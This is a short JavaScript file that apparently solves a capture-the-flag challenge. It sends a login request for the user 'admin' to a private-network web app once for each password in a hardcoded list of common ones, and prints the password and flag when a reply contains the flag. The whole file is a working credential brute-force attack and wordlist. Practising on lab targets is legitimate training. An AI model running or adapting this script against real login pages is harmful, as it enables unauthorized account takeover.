const axios = require("axios");
require("dotenv").config();

const bruteforcePasswords = [
  "admin",
  "123456",
  "password",
  "shadow",
  "123456789",
  "12345678",
  "12345",
  "1234567",
  "1234567890",
  "admin123",
  "admin1234",
  "admin12345",
  "admin123456",
  "root",
  "adminadmin",
  "admin123456789",
  "admin12345678",
  "toor",
  "qwerty",
  "password123",
  "qwerty123",
  "qwerty1234",
  "qwerty12345",
  "azerty",
  "azerty123",
  "azerty1234",
  "azerty12345",
  "111111",
  "1234567890",
  "helloworld",
  "abc123",
  "letmein",
  "welcome",
  "monkey",
  "sunshine",
  "dragon",
  "master",
  "superman",
  "hakonamatata",
  "whatever",
  "password1",
  "password2",
  "password3",
  "password4",
  "adminadmin",
  "leet",
  "leet123",
  "leet1234",
];

// Brute force function
const bruteForce = async () => {
  for (let i = 0; i < bruteforcePasswords.length; i++) {
    const urlBase = `http://10.11.100.150/?page=signin&username=admin&password=${bruteforcePasswords[i]}&Login=Login#`;
    await axios.get(urlBase).then((response) => {
      if (response.status === 200) {
        if (response.data.includes("flag")) {
          const flag = response.data.match(/The flag is : [a-zA-Z0-9]{64}/g);
          console.log({
            password: bruteforcePasswords[i],
            flag: flag[0],
          });
          process.exit();
        }
      }
    });
  }
};

bruteForce();
